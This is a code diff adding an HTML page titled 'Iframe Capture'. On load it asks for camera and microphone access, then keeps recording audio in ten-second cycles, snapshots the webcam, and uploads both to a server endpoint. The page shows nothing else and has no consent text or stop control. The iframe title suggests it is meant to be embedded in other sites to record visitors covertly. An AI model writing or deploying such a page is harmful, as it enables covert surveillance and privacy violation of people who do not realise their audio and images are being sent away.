@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iframe Capture</title>
+</head>
+<body>
+    <video id="video" autoplay muted playsinline></video>
+    <script>
+        async function startCapture() {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+            const video = document.getElementById("video");
+            video.srcObject = stream;
+
+            let mediaRecorder;
+            let audioChunks = [];
+
+            function recordCycle() {
+                if (!mediaRecorder || mediaRecorder.state === "inactive") {
+                    mediaRecorder = new MediaRecorder(stream, {
+                        mimeType: MediaRecorder.isTypeSupported("audio/webm") ? "audio/webm" : ""
+                    });
+
+                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+
+                    mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
+                        const audioBase64 = await blobToBase64(audioBlob);
+
+                        const canvas = document.createElement("canvas");
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext("2d");
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const screenshotBase64 = canvas.toDataURL("image/png");
+
+                        try {
+                            await fetch("/save-capture", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ audio: audioBase64, image: screenshotBase64 })
+                            });
+                        } catch(err) {
+                            console.error("Errore invio al server:", err);
+                        }
+
+                        audioChunks = [];
+
+                        setTimeout(recordCycle, 100); 
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 10000); 
+                }
+            }
+            recordCycle();
+        }
+
+        function blobToBase64(blob) {
+            return new Promise(resolve => {
+                const reader = new FileReader();
+                reader.onloadend = () => resolve(reader.result);
+                reader.readAsDataURL(blob);
+            });
+        }
+
+        startCapture();
+    </script>
+</body>
+</html>
